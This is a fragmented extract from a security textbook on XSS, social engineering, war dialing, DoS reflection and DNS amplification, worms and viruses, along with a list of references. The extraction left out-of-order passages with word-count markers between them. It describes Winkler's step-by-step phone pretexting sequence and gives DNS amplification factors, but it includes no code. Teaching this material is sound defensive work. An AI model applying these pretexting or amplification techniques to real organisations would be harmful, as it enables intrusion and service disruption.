[Word Count: 77]

XSS is not only the most common Web vulnerability but also the 
most common vulnerability class overall.48 While the impact may not 
seem as severe as that of the venerable buffer overflow, attackers fre­
quently exploit XSS vulnerabilities, often with severe consequences 
for the vulnerable site’s users.
[Word Count: 47]

No matter how quickly an organization patches the latest zero-day 
vulnerability or how many security products it deploys, one major 
vulnerability remains in every system: the human being. Social engi-
neering is the art and science of attacking the human element of 
a system to gain sensitive information or access to restricted areas 
or systems. In this section, we explain the concepts behind social
[Word Count: 64]

Everyone Join
www.StalkDaily.com!
Everyone Join
www.StalkDaily.com!
Everyone Join
www.StalkDaily.com!
[Word Count: 9]

Exhibit 3-32  A cross-site scripting (XSS) worm spreads between Twitter accounts via an XSS 
attack.
[Word Count: 15]

engineering and how modern attackers use the technique to further 
their criminal operations.
[Word Count: 13]

One way for an attacker to build trust with a target is with infor-
mation—ideally, nonpublic information. In this context, nonpublic 
information is anything the target believes the public in general does
[Word Count: 32]

Exhibit 3-33  The Art of Deception by Kevin Mitnick. (Mitnick, Kevin D. and William L. Simon; The 
Art of Deception. 2002. © Wiley–VCH Verlag GmbH & Co. KGaA. Reprorudced with permission.)
[Word Count: 31]

desk employee over the phone could result in a cornucopia of valuable 
nonpublic information.
[Word Count: 14]

To be successful, attackers often need to use these tactics and oth­
ers to gain enough information and access to complete their tasks. In 
Ira Winkler’s 1997 book Corporate Espionage, he describes a social-
engineering penetration test he conducted completely by phone that 
gave him complete access to a corporation’s systems.52 They completed 
the task by using pieces of nonpublic information to gain the trust of 
humans in the company. Each piece of information gave them the 
ability to get slightly more information. Winkler gains the key pieces 
in the following order:
[Word Count: 92]

1.	An executive’s name and the company’s phone number (from
[Word Count: 10]

an annual report and local phone book)
	
2.	An executive’s employee ID and cost center numbers (from
[Word Count: 17]

the executive’s secretary)
	
3.	A company phone directory (by posing as the executive and
[Word Count: 14]

using his or her cost center number)
	
4.	A list of fifty-five new employees (from the new-hire admin­
[Word Count: 18]

istration office by posing as a secretary of an angry executive 
who needed the list)
	
5.	The types of software and hardware used in the company
[Word Count: 26]

(from new employees by posing as a security officer giving 
training to each new employee by phone)
	
6.	The phone numbers and passwords for modems on the com­
[Word Count: 28]

pany network (from new employees during the same security 
training call)
[Word Count: 11]

While the information in numbers five and six is sensitive on its 
own, the previous items are small enough that they do not appear to 
be a major threat to security. By using them together, Winkler was 
able to gain all of the information he needed to access the computer 
systems without ever stepping foot in the building.
[Word Count: 58]

While the examples above all target a specific individual or group, 
attackers can also use social engineering against large groups of peo-
ple. The best example of widespread social engineering is phishing. In 
a phishing scheme, the attacker sends an e-mail to at least one person 
(but more likely thousands) that asks the target(s) to reveal private 
information (passwords, credit card numbers, etc.). The success of a
[Word Count: 67]

phishing scheme relies on how cleverly the attacker can manipulate 
the target into trusting the content of the e-mail.
[Word Count: 19]

Using a bank’s logo and copying its website comprise one way to 
establish this trust. The target sees these pieces of information and uses 
them to judge the trustworthiness of the e-mail. Phishing schemes 
also often appeal to a user’s wants or needs by offering a prize for fill­
ing out a form or threatening to lock the target’s account if he or she 
does not comply with the e-mail’s instructions.
[Word Count: 71]

More targeted phishing schemes, known as whaling or spear-
phishing attacks, allow social engineers with additional knowledge to 
create convincing e-mails. Consider the e-mail template shown in 
Exhibit 3-34.
[Word Count: 29]

Attackers commonly use social engineering to install malicious 
code. A computer system may have the latest patches and be pro­
tected against malicious code that spreads through known vulner­
abilities, but attackers can still infect a system if they convince the 
user to download and install their program. One popular way to do 
this is to entice a user with a video of a hot news topic, such as a celeb-
rity sex tape53 or death.54 When the target visits the website, the target
[Word Count: 84]

Exhibit 3-34  A Better Business Bureau (BBB) e-mail template using the ADP Employer Services 
theme.
[Word Count: 15]

receives notification that his or her browser cannot display the video 
unless he or she downloads new software (see Exhibit 3-35).
[Word Count: 21]

Exhibit 3-35  Attackers use social engineering and a fake software update to infect a target 
with malicious code.
[Word Count: 18]

Exhibit 3-36  A rogue antivirus (AV) popup displayed to users to entice them to download mali-
cious code.
[Word Count: 18]

In 1983, the movie WarGames caught the imagination of enterprising 
young hackers everywhere (see Exhibit 3-37). The movie was very 
influential to the hacker culture, and the act of dialing numbers to 
discover listening modems became known as war dialing. During 
the past twenty-five years, war dialing, war driving, and war spy­
ing developed as reconnaissance techniques used by hackers to dis­
cover possible targets and learn more about the networks accessible 
to them. This section discusses these techniques and the origin of the 
WarXing nomenclature.
[Word Count: 86]

Technology professionals love inventing new words, and security 
researchers are no different. War dialing, war driving, and war spy­
ing are names for reconnaissance techniques used by hackers to dis­
cover possible targets and learn more about the networks accessible 
to them.
[Word Count: 42]

In WarGames, Matthew Broderick portrays a high school student 
who uses his computer to dial every phone number in Sunnyvale, 
California automatically to search for modems owned by software 
companies in hopes of getting copies of the latest games before their 
release to the public. The movie was very influential to the hacker 
culture, and the act of dialing numbers to discover listening modems 
became known as war dialing.55
[Word Count: 69]

With the rise of broadband in homes and businesses during the 
1990s, fewer and fewer modems were attached to phone lines and 
war dialing became less popular, but criminals found new uses for 
the technology. Vishing, or voice-phishing, attacks use the phone 
system to gather secret information about a target. Attackers can 
use automated dialers that dial huge volumes of numbers until
[Word Count: 62]

a victim answers, at which point a voice-based computerized 
prompting system filled with social-engineering questions begins 
asking for (or demanding) personal information of the unsuspect­
ing targets.
[Word Count: 27]

For those with an interest in mapping Wi-Fi networks but with 
no car to carry them from place to place, there is war walking, war 
cycling, and even war flying. The first known instance of war flying 
occurred in 2002, when members of the WAFreeNet group flew over 
Perth, Australia, and mapped out that city’s networks from the air.57
[Word Count: 59]

Exhibit 3-38  A WiGLE map of U.S. wireless networks.
[Word Count: 9]

Exhibit 3-39  WARSpyLA war-spying equipment.
[Word Count: 5]

to be trivial, it is important for security professionals to be aware of 
these techniques and understand their place in hacker culture. There 
is very little that an organization can do to keep curious war drivers 
from mapping their networks, but administrators should ensure that 
they properly secure any wireless devices. For anyone wondering how 
many Wi-Fi networks are in your neighborhood, head over to the 
WiGLE Project.59 The results might be surprising.
[Word Count: 73]

Reflection can also allow an attacker to make traffic appear to come 
from many sources, making it more difficult for the victim to filter 
the incoming data. In Exhibit 3-40, the attacker sends ICMP echo 
requests (pings) to multiple intermediate systems while spoofing the IP
[Word Count: 45]

Exhibit 3-40  A reflection attack allows a single attacker to send traffic from many sources.
[Word Count: 15]

address in the packets to match that of the victim. Each compromised 
computer dutifully replies to the victim, flooding it with traffic.
[Word Count: 22]

While reflection attacks hide the source of a DoS initiator, they 
still require the initiator to be able to send as much data as he or she 
wants the victim to see. Amplification attacks take this to the next 
step, increasing the total amount of traffic received by the target to 
tens or hundreds of times the original payload size.
[Word Count: 60]

One of the oldest amplification attacks is known as the smurf 
attack. In a smurf attack, the initiator sends a ping to the IP broadcast 
address, spoofing the victim’s IP address. Exhibit 3-41 shows how the 
smurf attack works by sending a single packet that results in an ampli­
fication of the total traffic received by the victim. Smurf attacks are 
no longer a major threat because router configurations no longer pass 
broadcast packets to other networks, limiting the range of a smurf 
attack to the local subnet.
[Word Count: 88]

A more recently discovered class of DoS attacks takes advantage 
of the DNS infrastructure to amplify the amount of traffic a single 
node can send. A DNS request for the A record of a specific domain, 
such as google.com, returns much more data than is required to make 
the request. DNS requests commonly used connectionless UDP mes­
sages, making them ideal for reflection and amplification attacks.
[Word Count: 66]

The key to launching an amplification attack is finding DNS serv­
ers that will perform recursive queries and return a larger amount of 
data than was in the original request. These servers are commonly 
known as open resolvers. For more information about recursive DNS 
queries and the DNS in general, refer to the “State of the Hack” arti-
cle entitled “iDefense Explains the Domain Name System (DNS).”60
[Word Count: 67]

Exhibit 3-41  A smurf amplification attack multiplies the total traffic sent by the initiator.
[Word Count: 14]

A typical DNS A record query requires the client to send at least 49 
bytes of data, depending on the length of the domain name requested. 
In some cases, the response message may be smaller than the original 
request, but it is very simple to ensure a large response by requesting 
additional information. Exhibit 3-42 shows how this type of attack 
exploits DNS servers.
[Word Count: 64]

These types of attacks rely on open resolvers to carry out malicious 
deeds, but a new form of DNS amplification recently emerged that
[Word Count: 23]

Ampliﬁed DNS
Responses
Small DNS
Responses
[Word Count: 6]

Exhibit 3-42  DNS servers amplify the amount of traffic generated by the DoS initiator.
[Word Count: 14]

can take advantage of locked-down DNS servers. In January 2009, 
attackers launched a large-scale distributed denial of service (DDoS) 
attack against an ISP named ISPrime.61 To take advantage of DNS 
servers that are not open resolvers, the attackers made requests for 
“.”, the designation of the root servers. DNS servers respond to these 
requests with the IP address of each of the root servers, even when 
they do not allow recursive queries. This response can include more 
than 500 bytes of data and only requires a 49-byte request, an ampli­
fication factor of more than 10.
[Word Count: 96]

Amplifying the amount of bandwidth generated is very beneficial 
in a DoS attack. An infected computer using a cable modem may only 
be able to generate 512 Kbps of bandwidth, which is not enough to 
cause a DoS for most servers. Amplify this value by thirty times, and 
use this technique on 1,000 nodes, and a small botnet could easily 
generate more than 14 Gbps of traffic, enough to saturate almost any 
Internet connection.
[Word Count: 74]

3.2.4.1  Defeating Amplification  DNS amplification attacks rely on 
two principals without which they could not be effective. First, UDP 
packets can carry spoofed IP addresses, allowing attackers to reflect 
traffic off DNS servers. This does not necessarily need to be the 
case. While UDP does not make it possible to verify the source of 
a packet, an ISP can inspect packets leaving their network to ensure 
that the source IP address could actually reside within that network. 
The Internet Engineering Task Force (IETF) “Best Current Practice 
(BCP) 38” (BCP38) document suggests this type of filtering.62 While
[Word Count: 96]

Exhibit 3-43  The amplification factor depends on the type of DNS query made.
[Word Count: 13]

many networks have implemented the filtering suggested by BCP38, 
many large networks have refused to, stating that the filtering requires 
too much overhead for their equipment or that their customers may 
need to generate traffic with spoofed-source addresses.
[Word Count: 38]

DNS amplification attacks are not a recent discovery, but DDoS 
networks have not commonly used them. If they began taking advan­
tage of amplification, small botnets could become much more power­
ful than ever before.
[Word Count: 35]

1.	 Tenouk, 
“Buffer 
Overflow 
9,” 
n.d., 
http://www.tenouk.com/
Bufferoverflowc/Bufferoverflow5.html.
	
2.	 Kernel Panic, “Writing Shellcode for Linux and *BSD,” n.d., http://www.
[Word Count: 19]

kernel-panic.it/security/shellcode/shellcode3.html.
	
3.	 No Login, “Understanding Windows Shellcode,” December 6, 2003,
[Word Count: 10]

http://www.hick.org/code/skape/papers/win32-shellcode.pdf.
	
4.	 Phrack, 
“Phrack 
Issues,” 
n.d., 
http://www.phrack.com/issues.
html?issue=57&id=15.
	
5.	 iDefense explained stack buffer overflows in “State of the Hack,” iDe-
[Word Count: 20]

fense Weekly Threat Report, ID# 480099, January 5, 2009.
	
6.	 http://www.secdev.org/projects/shellforge. Accessed August 11, 2010.
	
7.	 Metasploit, “Payloads,” n.d., http://metasploit.com:55555/PAYLOADS. 
	
8.	 For more information on how buffer overflows work, please see the iDe-
[Word Count: 33]

fense Weekly Threat Report, ID# 480093, January 5, 2009.
	
9.	 U.S. Computer Emergency Readiness Team, “Vulnerability Note
[Word Count: 17]

VU#540517),” 2004, http://www.kb.cert.org/vuls/id/540517.
	 10.	 CodePlex, “SafeInt,” 2006–2010, http://www.codeplex.com/SafeInt.
[Word Count: 8]

11.	 National Institute of Standards and Technology, “National Vulnerability
[Word Count: 9]

Database,” n.d., http://web.nvd.nist.gov.
	 12.	 David Litchfield, “ Defeating the Stack Based Buffer Overflow Prevention
[Word Count: 14]

Mechanism of Microsoft Windows 2003 Server,” September 8, 2003, 
http://www.ngssoftware.com/papers/defeating-w2k3-stack-protection.
pdf.
	 13.	 http://www.ciac.org/ciac/bulletins/l-040.shtml.
	 14.	 iDefense, “State of the Hack: An In-Depth Look at a SQL Injection
[Word Count: 26]

Attack,” iDefense Weekly Threat Report, ID# 473302, October 6, 
2008.
	 15.	 PHP, “mysql_real_escape_string Documentation,” 2001–2010, http://
[Word Count: 16]

us2.php.net/mysql_real_escape_string.
	 16.	 ModSecurity, [homepage], 2004–2010, http://www.modsecurity.org.
	 17.	 OWASP, “Web Application Firewall,” n.d., http://www.owasp.org/index.
[Word Count: 13]

php/Web_Application_Firewall.
	 18.	 J. D. Meier, Alex Mackman, Blaine Wastell, Prashant Bansode, and Andy
[Word Count: 13]

Wigley, “How To: Protect from SQL Injection in ASP.NET,”– May 
2005, http://msdn.microsoft.com/en-us/library/ms998271.aspx.
	 19.	 OWASP, “Testing for SQL Injection,” n.d., http://www.owasp.org/index.
[Word Count: 20]

php/Testing_for_SQL_Injection_(OWASP-DV-005).
	 20.	 Adobe, “Tips and Tricks: Quick Overview of PDF Files,” 2005, http://
[Word Count: 13]

www.adobe.com/devnet/livecycle/articles/lc_pdf_overview_format.pdf; 
and Adobe Partners, “Adobe JavaScript Scripting Reference,” n.d., http://
partners.adobe.com/public/developer/en/acrobat/sdk/AcroJS.pdf.
	 21.	 Adobe Partners, “Adobe JavaScript Scripting Guide,” September 27,
[Word Count: 20]

2005, http://partners.adobe.com/public/developer/en/acrobat/sdk/pdf/
javascript/AcroJSGuide.pdf.
	 22.	 Security Labs, “Origami PDF Tool,” 2009, http://www.security-labs.org/
[Word Count: 11]

origami/.
	 23.	 Didier Stevens, “PDF Tools,” n.d., http://blog.didierstevens.com/
[Word Count: 8]

programs/pdf-tools/.
	 24.	 Jsunpack Blog, “Jsunpack-n Update,” June 30, 2009, http://jsunpack.
[Word Count: 10]

blogspot.com/2009/06/jsunpack-n-update-automatic-shellcode.html.
	 25.	 Thom Parker, “New Features in Adobe Reader 9,” AcrobatUsers.com, June
[Word Count: 12]

17, 2008, http://www.acrobatusers.com/blogs/thomp/acrobat-9-javascript-
revealed.
	 26.	 Die.net, “pdftotext manual page,” n.d., http://linux.die.net/man/1/
[Word Count: 11]

pdftotext.
	 27.	 Milw0rm.com, “Race Condition Exploit for Xorg-x11-xfs,” vl4dZ,
[Word Count: 9]

February 21, 2009, http://milw0rm.com/exploits/5167; and iDefense 
Intelligence Operations, “Red Hat Enterprise Linux init.d XFS Script 
chown Race Condition Vulnerability,” July 12, 2007, http://labs.idefense.
com/intelligence/vulnerabilities/display.php?id=557. 
	 28.	 Milw0rm.com, “Linux Kernel 2.6.29 ptrace_attach() Local Root Race
[Word Count: 33]

Condition Exploit,” May 14, 2009, Prdelka, http://milw0rm.com/
exploits/8678.
[Word Count: 8]

29.	 iDefense, “State of the Hack: iDefense Explains . . .Obfuscation,” iDe­
[Word Count: 12]

fense Weekly Threat Report, ID# 486147, May 18, 2009.
	 30.	 iDefense, “State of the Hack: iDefense Explains . . .SQL Injection,” iDe­
[Word Count: 22]

fense Weekly Threat Report, ID# 480996, January 26, 2009.
	 31.	 Dezend, “Zend Decoder for php4/php5,” n.d., http://old.boem.me/dezend/.
	 32.	 Ha.ckers.org, “Slowloris HTTP DoS,” October 7, 2009, http://ha.ckers.
[Word Count: 26]

org/blog/20090617/slowloris-http-dos/.
	 33.	 iDefense, “State of the Hack: iDefense Explains Domain Name System
[Word Count: 12]

(DNS) Amplification Attacks,” iDefense Weekly Threat Report, ID# 
482815, February 26, 2009.
	 34.	 CNet.com, “How Pakistan Knocked YouTube Offline (and How to
[Word Count: 22]

Make Sure It Never Happens Again),” October 6, 2009, http://news.
cnet.com/8301-10784_3-9878655-7.html.
	 35.	 VeriSign, “VeriSign Internet Defense Network,” October 8, 2009, http://
[Word Count: 21]

www.verisigninternetdefensenetwork.com.
	 36.	 Openwall Project, “Openwall Wordlists Collection,” n.d., http://www.
[Word Count: 9]

openwall.com/wordlists/.
	 37.	 Fizzgig’s Fun Haus, “pwdump6: Pissing Off McAfee since 2005,” 2008,
[Word Count: 12]

http://www.foofus.net/fizzgig/pwdump/.
	 38.	 Distributed Rainbow Table Project, “Free Rainbow Tables,” n.d., http://
[Word Count: 11]

www.freerainbowtables.com.
	 39.	 Ophcrack, “XP Rainbow Tables,” n.d., http://ophcrack.sourceforge.net/
[Word Count: 8]

tables.php.
	 40.	 Openwall Project, “John the Ripper Password Cracker,” n.d., http://www.
[Word Count: 11]

openwall.com/john/.
	 41.	 National Institute of Standards and Technology, “National Vulnerability
[Word Count: 10]

Database.”
	 42.	 </XSSed>, “XSS (Cross-Site Scripting) Information and Vulnerable
[Word Count: 9]

Websites Archive,” May 7, 2009, http://xssed.com.
	 43.	 Jeremiah Grossman, “The Origins of Cross-Site Scripting (XSS),” July
[Word Count: 16]

30, 2006, http://jeremiahgrossman.blogspot.com/2006/07/origins-of-
cross-site-scripting-xss.html.
	 44.	 Mozilla, “Same Origin Policy for JavaScript,” May 7, 2009, https://devel­
[Word Count: 15]

oper.mozilla.org/en/Same_origin_policy_for_JavaScript.
	 45.	 For more information on SQL injection vulnerabilities, see iDefense,
[Word Count: 11]

“State of the Hack: iDefense Explains SQL Injection,” iDefense Weekly 
Threat Report, ID# 480996, January 26, 2009.
	 46.	 Damon Cortesi, “Twitter StalkDaily Worm Postmortem,” May 7, 2009,
[Word Count: 27]

http://webcache.googleusercontent.com/search?q=cache:http://www.
dcortesi.com/2009/04/11/twitter-stalkdaily-worm-postmortem/
	 47.	 OWASP, 
“XSS 
(Cross-Site 
Scripting) 
Prevention 
Cheat 
Sheet,” 
May 
7, 
2009, 
http://www.owasp.org/index.php/
XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet.
	 48.	 Common Weakness Enumeration, “Vulnerability Type Distributions in
[Word Count: 23]

CVE,” May 7, 2009, http://cwe.mitre.org/documents/vuln-trends/index.
html.
[Word Count: 6]

49.	 Sarah Granger, “Social Engineering Fundamentals, Part I: Hacker
[Word Count: 9]

Tactic,” Security Focus, December 28, 2001, http://www.securityfocus.
com/infocus/1527. 
	 50.	 CipherTrust, “Social Engineering: The Email Security Wildcard,” April
[Word Count: 17]

25, 2006, http://www.ciphertrust.com/resources/articles/articles/social.
php. 
	 51.	 Shaun Nichols, “Free Chocolate Provides Password Bounty,” V3, April
[Word Count: 14]

17, 2008, http://www.v3.co.uk/vnunet/news/2214500/users-melting-
password-bribes.
	 52.	 Ira Winkler, “Crippling a Company by Telephone,” NASA, October 22,
[Word Count: 15]

2009, 
http://www.hq.nasa.gov/office/ospp/securityguide/V1comput/
Case2.htm#Case%202.
	 53.	 Dancho Danchev, “Fake Celebrity Video Sites Serving Malware: Part
[Word Count: 13]

Three,” Dancho Danchev’s Blog: Mind Streams of Information Security 
Knowledge, February 23, 2009, http://ddanchev.blogspot.com/2009/02/
fake-celebrity-video-sites-serving.html.
	 54.	 Jerome Segura, “Michael Jackson Malware in Italian,” Malware Diaries,
[Word Count: 25]

June 
30, 
2009, 
http://blogs.paretologic.com/malwarediaries/index.
php/2009/06/30/michael-jackson-malware-in-italian/. 
	 55.	 iDefense, “State of the Hack: iDefense Explains . . .Rogue Anti-Virus,”
[Word Count: 17]

iDefense Weekly Threat Report, ID# 526335, October 5, 2009.
	 56.	 Patrick S. Ryan, “War, Peace, or Stalemate: Wargames, Wardialing,
[Word Count: 19]

Wardriving, and the Emerging Market for Hacker Ethics,” Virginia 
Journal of Law & Technology 9, no. 7 (Summer 2004): http://ssrn.com/
abstract=585867.
	 57.	 WiGLE Project, “WIGLE.net,” n.d., http://www.wigle.net.
	 58.	 Suelette Dreyfus, “War Driving Takes to the Air over Perth,”
[Word Count: 38]

Fairfax Digital, August 27, 2002, http://www.smh.com.au/arti­
cles/2002/08/24/1030052995854.html.
	 59.	 WARSpy Los Angeles, “Our Rig,” n.d., http://www.warspyla.com/rigg.
[Word Count: 15]

html.
	 60.	 WiGLE Project, “WIGLE.net.”
	 61.	 iDefense, “State of the Hack: iDefense Explains Domain Name System
[Word Count: 16]

(DNS),” iDefense Weekly Threat Report, ID# 482279, February 9, 2009.
	 62.	 Robert McMillan, “Porn Site Feud Spawns New DNS Attack,” IT World,
[Word Count: 22]

February 10, 2009, http://www.itworld.com/security/62107/porn-site-
feud-spawns-new-dns-attack.
	 63.	 Internet Engineering Task Force (IETF), “Best Current Practice (BCP)
[Word Count: 15]

38,” 2000, http://www.ietf.org/rfc/rfc2827.txt.
	 64.	 Don Jackson, “DNS Amplification Variation Used in Recent DDoS
[Word Count: 13]

Attacks,” SecureWorks, February 2, 2009, http://www.secureworks.com/
research/threats/dns-amplification/.
[Word Count: 7]

195
© 2011 by Taylor & Francis Group, LLC
[Word Count: 9]

Computer worms constitute a large class of malicious code that spreads 
between computers by distributing copies of themselves in a variety 
of ways. The worm is one of the earliest forms of malicious code and 
may be either benign or destructive. Malicious code is only a worm if 
it spreads to other systems by duplicating itself without attaching to 
other files.
[Word Count: 61]

Worms typically have two roles. The first is to spread to additional 
computers, but most also have a secondary task known as a payload. 
A worm’s payload is what the attacker programs the worm to accom­
plish after it spreads. In the case of the Morris worm, the intention 
was to gauge the size of the Internet, but most worms have a much 
more malicious payload. This can include distributed denial of service 
(DDoS) attacks, spam distribution, cyber crime, or anything else the 
attacker chooses.
[Word Count: 85]

In the years since Morris’s program got out of control, many more 
worms have spread across the Internet. Many worms target vulnera-
bilities in popular network services like HTTP servers and NetBIOS. 
However, many do not use vulnerabilities to spread, instead using
[Word Count: 42]

e-mail, peer-to-peer (P2P) networks, social networks, and mobile 
device communication protocols. These propagation techniques rely 
on tricking the user into executing a program and cannot spread with­
out any human interaction. Worms are not limited to a single propa­
gation method but can use any or all of these methods at once (see 
Exhibit 4-1).
[Word Count: 55]

E-mail worms spread by sending a message designed to entice 
the recipient into clicking a link or downloading an attachment that 
contains a copy of the worm. One famous example of this type of 
malicious code is the ILOVEYOU worm, which began spreading in 
May 2000.2 ILOVEYOU quickly infected thousands of computers 
by sending an e-mail with the subject header “I love you.” Another 
means of spreading worms is Instant Messaging (IM) technologies. 
As IMs have gained in popularity, worms have begun to use these 
popular networks to spread between systems.
[Word Count: 91]

Network worms, which often spread without any user interaction, 
can infect many computers in a very short amount of time. These 
worms may infect other systems by exploiting vulnerabilities in soft­
ware or by attempting to guess passwords that protect systems from 
intrusion. Blaster, which began spreading in August 2003, was a 
network worm that spread through a vulnerability in the Microsoft 
Windows RPC interface (MS03-026). The purpose of Blaster was to 
strike Microsoft’s Windows Update website with a DDoS attack that 
the worm would launch on August 15, 2003.3 Microsoft averted the 
attack by preemptively taking the website offline.
[Word Count: 100]

Exhibit 4-1  A single worm can use many propagation techniques.
[Word Count: 10]

As with worms that spread through e-mail, those that spread 
through P2P networks must also rely on social-engineering tech­
niques rather than automatic propagation. These worms copy them­
selves to directories that popular P2P applications use to share files. 
By renaming themselves so they appear to be movies or software, the 
worms entice other users into downloading and executing them.
[Word Count: 60]

To mitigate the threat from computer worms, administrators must 
protect systems from all propagation techniques. The following mea-
sures will decrease the likelihood of a worm infection in a network:
[Word Count: 30]

•	 Use antivirus products to scan incoming e-mails and IMs for
[Word Count: 11]

malicious links.
•	 Disable autorun functionality for USB devices.
•	 Apply patches for vulnerabilities in network services in a
[Word Count: 19]

•	 Disable access to P2P networks.
•	 Educate users on the dangers of worms that use social-engi­
[Word Count: 17]

Like their malicious cousins, viruses and Trojan horses, worms 
are a significant threat to modern networks. In the twenty-plus 
years that have passed since Robert Morris released the first 
Internet worm, new tactics have developed that allow for faster 
propagation with a higher impact. With the arrival of new com­
munication technologies, attackers also develop new ways to spread 
malicious programs.
[Word Count: 61]

The concept of viruses and malware has been with us for decades, 
along with the development of detection technologies. In this sec­
tion, we explain the differences between viruses and other types of 
malware that can infect users and organizations.
[Word Count: 40]

A virus, on the other hand, is not self-contained and requires the 
infection of a host file to spread. A virus is parasitic, infecting a sys-
tem by attaching itself to other files. A computer virus spreads in a 
similar manner as a biological virus, which injects DNA into a host 
cell to replicate itself and causes the cell to burst, releasing the repli-
cated viruses to spread to other cells. A computer virus achieves the
[Word Count: 76]

technological equivalent by writing its code into a host file. The virus 
eventually runs when a user opens the infected host file.
[Word Count: 22]

Now that the distinction between viruses and other types of mal­
ware is clear, a brief history of computer viruses will provide some 
helpful background information. The first recorded IBM PC-based 
virus, called the “Brain,” debuted in January 1986. The Brain copied 
itself into a floppy disk’s boot sector, the space on the floppy disk used 
to run code when the system starts. Once in memory, it attempted to 
copy itself to other floppy disks; the main side effect of an infection 
was a change to the volume label to “(c) Brain.”9
[Word Count: 92]

The Brain virus was not particularly destructive but took advantage 
of the era’s heavy use of floppy disks. Other viruses, however, were 
not as harmless and caused damage to infected systems. In 1987, the 
Jerusalem virus and its variants began infecting systems. This virus 
resided in memory and infected all executable files (.com and .exe) on 
the system. When a user opened an infected file, the virus deleted the 
infected file.10
[Word Count: 71]

Viral code within infected host files often has three distinct parts: 
the discovery module, the replication module, and the payload. The 
discovery module enables the virus to locate host files, and the replica­
tion module carries out the infection by copying the entire viral code 
into the host file. Exhibit 4-2 shows an infected application replicat-
ing the virus by writing the entire virus to the host file.
[Word Count: 68]

Last, the payload contains code to perform additional actions on 
the infected system aside from file discovery and replication. The spe-
cific actions carried out by the payload depend on the purpose of the 
virus. Payloads range from harmless code, such as the Cascade virus 
that altered text displayed on screens, to destructive code, such as the
[Word Count: 57]

Exhibit 4-2  A virus infecting a host file.
[Word Count: 8]

Jerusalem virus that deleted infected files. Exhibit 4-3 shows screen­
shots of the Cascade virus altering the text within MS-DOS.
[Word Count: 20]

The security community separates viruses into two groups based 
on how the virus infects other files after it executes: resident and non­
resident. A nonresident virus infects other files only when the infected 
file runs. A resident virus differs by loading itself into memory and 
continuing to run after the infected file closes.
[Word Count: 53]

Resident viruses fall into two additional categories: fast infectors 
and slow infectors.11 Viruses loaded into memory have the ability to 
infect many files very quickly because they can infect any file on a 
system. Viruses that take advantage of this ability are fast infectors, as 
they try to infect as many files as quickly as possible. This type of virus
[Word Count: 60]

Exhibit 4.3  Screenshot of Cascade virus changing MS-DOS text.
[Word Count: 9]

lacks stealth, and the consumption of resources makes the infection 
obvious to the victim.
[Word Count: 14]

Slow infector viruses have specific criteria with which they infect 
other files. Two common criteria used to infect other files are time-
based (such as only infecting files on certain days) and access-based 
(such as only infecting copied files) criteria. Infections occurring only 
during specific situations slow down the infection rate, making the 
virus inconspicuous and harder to detect.
[Word Count: 59]

To write code to another file, viruses generally add their code to the 
beginning or end of a file. Methods that are more sophisticated, how­
ever, can also write the virus code within empty or unused space within 
the file. Viruses that use these techniques, known as cavity viruses, can 
add their code to a host file without changing the file’s size.
[Word Count: 62]

The impact that viruses have on systems demands a solution to 
detect and clean up infections. Antivirus products attempt to detect 
viruses by searching files for discovery modules, replication modules, 
or the payload. Detection methods include specific pattern matches 
within the executable or heuristic methods to detect viral activity.
[Word Count: 49]

These antivirus products also attempt to clean the virus infection 
by removing the virus’s code and restoring the original file’s contents. 
The antivirus program cannot simply delete an infected file because 
doing so may have adverse effects on the system’s operation. The anti-
virus must detect the technique the virus used to execute the viral 
code within the infected file as described earlier in this section. Once 
the antivirus determines this technique, the antivirus program must 
remove the file alterations to reconstruct the original file. If the recon-
struction of the file is successful, then the virus infection is gone.
[Word Count: 100]

To avoid detection of the decryption routine, a technique called 
polymorphism surfaced. A polymorphic virus still relies on a decryp­
tion routine to decrypt the encrypted code; however, this type of virus 
has a polymorphic engine within its code that changes the encryp­
tion and decryption routines each time the virus infects another file. 
Therefore, polymorphic viruses change their entire appearance with 
each infection yet have the same functionality.
[Word Count: 69]

Another technique, called metamorphism, allows a virus to change 
its appearance to avoid antivirus detection. Metamorphic viruses 
use an embedded engine to alter their code much like a polymor­
phic virus; however, the metamorphic engine actually changes the 
virus’s code. For example, the metamorphic engine can use differ­
ent registers within the code, add no-operation-performed (NOP) 
instructions, or change the code’s flow with different jump and call 
instructions.15 These changes alter the binary composition of the 
virus between infected files, which makes detection by an antivirus 
product difficult.
[Word Count: 88]

Viruses have been around for decades, but many consider viruses 
outdated and no longer a threat. The overwhelming number of Trojans 
and worms that plague today’s networks overshadow viruses; however, 
many viruses still exist, including a sophisticated, feature-rich virus 
known as Virut. Virut surfaced in 2006 and evolved into a hybrid 
malware that possesses characteristics of Trojans and viruses. Virut 
first runs as a self-contained executable that is like a Trojan; however,
[Word Count: 72]

it also infects executable files to establish persistence and longevity to 
the infection.
[Word Count: 13]

Virut is a resident polymorphic virus that infects other executables 
on the system upon access. Recent variants of Virut have infected 
Web page files with the extension HTM, PHP, or ASP by writing 
an inline frame (IFrame) to the file. The IFrame is an HTML ele­
ment that embeds a frame within the browser window. These IFrames 
allow attackers to forward users to a malicious page without interac­
tion. Virut infects Web page files hoping to infect other users who 
visit the Web page with the virus.16
[Word Count: 87]

In addition to Virut’s infection methods, its payload opens a back­
door on the infected system and connects to an Internet Relay Chat 
(IRC) channel. The IRC channel allows the attacker to command 
the infected system to download executables, further infecting the 
system. These capabilities show the danger that contemporary viruses 
pose to infected systems.
[Word Count: 55]

4.2  Evading Detection and Elevating Privileges
[Word Count: 6]

For legitimate programmers, source code obfuscation helps pro-
tect their intellectual property by making it more difficult to steal. 
Malicious programmers benefit from the same techniques, which 
complicate malicious code reverse engineering and human analysis, 
thereby frustrating efforts to understand and mitigate the threat. This 
section explains the concept of obfuscation at a high level and delves 
into its common uses and techniques.
[Word Count: 63]

The level of difficulty in analyzing data and code depends on the 
effort put forth by the developer to obscure related information and 
deter analysts. Developers use a technique known as obfuscation to 
transform data or source code into obscure or unclear representations 
while retaining the original functionality. Developers, both benign 
and malicious, use obfuscation techniques to hide the data or the 
behavior of an application.
[Word Count: 66]

Successful obfuscation disrupts decompilers and results in faulty 
or incomplete source code. Faulty or incomplete source code compli­
cates the situation by providing broken or incorrect code for analy­
sis. An example of obfuscation that deters decompilation and source 
code analysis is a product named Zend Guard that encodes and 
obfuscates PHP applications. Zend Guard uses encoding and other 
obfuscation routines to turn cleartext PHP scripts into binary code.17 
Deobfuscating Zend Guard binaries into the original cleartext PHP 
code is possible with an application called Dezender.
[Word Count: 86]

In addition to confusing decompilers, obfuscating code also 
increases the difficulty in researchers’ ability to analyze code. Without 
decompiled source code, code analysis requires reverse engineering. 
Reverse engineering demands a high level of skill to analyze precom-
